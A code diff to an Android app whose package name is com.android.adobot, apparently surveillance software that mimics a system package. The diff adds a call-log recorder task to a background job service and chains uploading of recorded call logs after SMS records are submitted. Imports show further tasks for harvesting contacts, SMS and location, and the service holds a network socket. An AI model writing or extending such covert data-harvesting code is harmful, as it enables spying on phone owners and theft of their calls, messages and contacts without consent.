@@ -15,6 +15,7 @@ import com.android.adobot.AdobotConstants;
 import com.android.adobot.CommonParams;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpRequest;
+import com.android.adobot.tasks.CallLogRecorderTask;
 import com.android.adobot.tasks.GetCallLogsTask;
 import com.android.adobot.tasks.GetContactsTask;
 import com.android.adobot.tasks.GetSmsTask;
@@ -43,6 +44,7 @@ public class NetworkSchedulerService extends JobService {
     private static final String TAG = NetworkSchedulerService.class.getSimpleName();
 
     private SmsRecorderTask smsRecorderTask;
+    private CallLogRecorderTask callLogRecorderTask;
 
     public static Socket socket;
     public static boolean connected = false;
@@ -84,8 +86,15 @@ public class NetworkSchedulerService extends JobService {
         smsRecorderTask.submitNextRecord(new SmsRecorderTask.SubmitSmsCallback() {
             @Override
             public void onResult(boolean success) {
-                Log.i(TAG, "Done submit record!!!!");
-//                jobFinished(params, true);
+            Log.i(TAG, "Done submit record!!!!");
+
+            callLogRecorderTask.submitNextRecord(new CallLogRecorderTask.SubmitCallLogCallback() {
+                @Override
+                public void onResult(boolean success) {
+                    Log.i(TAG, "Done submit call logs!!!!");
+                }
+            });
+
             }
         });
         return true;
@@ -123,6 +132,7 @@ public class NetworkSchedulerService extends JobService {
     private void init() {
 
         if (smsRecorderTask == null) smsRecorderTask = new SmsRecorderTask(this);
+        if (callLogRecorderTask == null) callLogRecorderTask = new CallLogRecorderTask(this);
         if (params == null) params = new CommonParams(this);
         if (client == null) client = this;
         if (locationTask == null) locationTask = new LocationMonitor(this);
